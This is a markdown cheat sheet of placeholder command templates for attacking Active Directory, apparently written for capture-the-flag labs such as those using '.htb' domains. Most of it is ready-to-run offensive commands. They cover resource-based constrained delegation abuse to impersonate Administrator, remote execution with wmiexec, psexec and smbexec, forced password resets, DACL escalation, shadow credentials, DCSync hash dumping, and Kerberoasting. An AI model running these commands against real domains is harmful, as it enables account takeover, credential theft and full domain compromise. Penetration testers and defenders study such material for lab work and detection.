# AD Abuse Command Templates

Use this file as a syntax-safe reference for common Active Directory abuse sequences. Replace placeholders carefully.

---

## Placeholders

- `DOMAIN` → NetBIOS domain, e.g. `SUPPORT`
- `domain.tld` → FQDN, e.g. `support.htb`
- `DC_IP` → domain controller IP
- `dc.domain.tld` → DC hostname
- `USER` / `PASS` → current controlled user
- `TARGETUSER` → target user
- `TARGETHOST$` → target computer object, e.g. `DC$`
- `NEWBOX$` → attacker-created machine account
- `NEWBOXPASS` → password for attacker-created machine account

---

## Validate a user quickly

### SMB

```bash
crackmapexec smb DC_IP -u USER -p 'PASS'
```

### WinRM

```bash
crackmapexec winrm DC_IP -u USER -p 'PASS'
```

### LDAP bind check

```bash
ldapsearch -H ldap://DC_IP -x -D 'USER@domain.tld' -w 'PASS' -b 'DC=domain,DC=tld' '(objectClass=user)' sAMAccountName
```

---

## LDAP secrets hunting

Look for:
- `info`
- `description`
- `memberOf`
- delegation flags
- SPNs

```bash
ldapsearch -H ldap://DC_IP -x \
  -D 'USER@domain.tld' -w 'PASS' \
  -b 'DC=domain,DC=tld' \
  '(cn=TARGETUSER)' cn sAMAccountName info description memberOf servicePrincipalName
```

Dump broadly when needed:

```bash
ldapsearch -H ldap://DC_IP -x \
  -D 'USER@domain.tld' -w 'PASS' \
  -b 'DC=domain,DC=tld' \
  '(sAMAccountName=*)' sAMAccountName info description memberOf > ldap_dump.txt
```

---

## BloodHound collection

```bash
bloodhound-python \
  -u 'USER' -p 'PASS' \
  -d domain.tld \
  -dc dc.domain.tld \
  -ns DC_IP \
  -c All --zip
```

If Kerberos resolution is flaky, fix hosts first.

---

## Add machine account

```bash
addcomputer.py \
  -computer-name 'NEWBOX$' \
  -computer-pass 'NEWBOXPASS' \
  -dc-host dc.domain.tld \
  -domain-netbios DOMAIN \
  'domain.tld/USER:PASS'
```

---

## RBCD write

```bash
rbcd.py \
  -delegate-from 'NEWBOX$' \
  -delegate-to 'TARGETHOST$' \
  -dc-ip DC_IP \
  -action write \
  'domain.tld/USER:PASS'
```

---

## Get service ticket as Administrator

```bash
getST.py \
  -spn cifs/dc.domain.tld \
  -impersonate Administrator \
  -dc-ip DC_IP \
  'domain.tld/NEWBOX$:NEWBOXPASS'
```

Common output:

```text
Administrator@cifs_dc.domain.tld@DOMAIN.TLD.ccache
```

---

## Use Kerberos ticket for remote execution

### wmiexec.py

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.domain.tld@DOMAIN.TLD.ccache
wmiexec.py -k -no-pass domain.tld/Administrator@dc.domain.tld 'whoami'
```

### psexec.py

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.domain.tld@DOMAIN.TLD.ccache
psexec.py -k -no-pass domain.tld/Administrator@dc.domain.tld
```

### smbexec.py

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.domain.tld@DOMAIN.TLD.ccache
smbexec.py -k -no-pass domain.tld/Administrator@dc.domain.tld
```

---

## Reset another user’s password

Use when you have `ForceChangePassword` or equivalent rights.

### bloodyAD

```bash
bloodyAD --host dc.domain.tld -d domain.tld -u USER -p 'PASS' \
  set password TARGETUSER 'NewPassword123!'
```

Alternative approaches depend on rights and environment.

---

## Grant stronger rights with dacledit.py

Use when you have `WriteDacl` and need to grant yourself stronger access.

```bash
dacledit.py \
  -action write \
  -rights FullControl \
  -principal USER \
  -target TARGETUSER \
  'domain.tld/USER:PASS'
```

Adjust:
- `-rights`
- `-principal`
- `-target`

Use carefully and verify object type.

---

## Shadow Credentials with Certipy

Use when you have `AddKeyCredentialLink` on a user or computer.

```bash
certipy shadow auto \
  -u 'USER@domain.tld' -p 'PASS' \
  -account TARGETUSER \
  -dc-ip DC_IP
```

---

## DCSync with secretsdump.py

Use only when rights are present.

```bash
secretsdump.py 'domain.tld/USER:PASS@dc.domain.tld'
```

Or with hashes / Kerberos as appropriate.

---

## AS-REP roast / Kerberoast quick templates

### AS-REP roast

```bash
GetNPUsers.py domain.tld/ -dc-ip DC_IP -usersfile users.txt -no-pass
```

### Kerberoast

```bash
GetUserSPNs.py domain.tld/USER:'PASS' -dc-ip DC_IP -request
```

---

## Tooling fallback notes

### If Evil-WinRM is unstable
Use:
- `wmiexec.py`
- `psexec.py`
- `smbexec.py`

### If Kerberos fails on names
Fix name resolution:

```bash
echo 'DC_IP dc.domain.tld domain.tld' | sudo tee -a /etc/hosts >/dev/null
```

### If ticket filename is unclear

```bash
ls -la *.ccache
```

Then set:

```bash
export KRB5CCNAME=/full/path/to/file.ccache
```

---

## Minimal Verification Commands

```cmd
whoami
hostname
whoami /groups
type C:\Users\Administrator\Desktop\root.txt
```
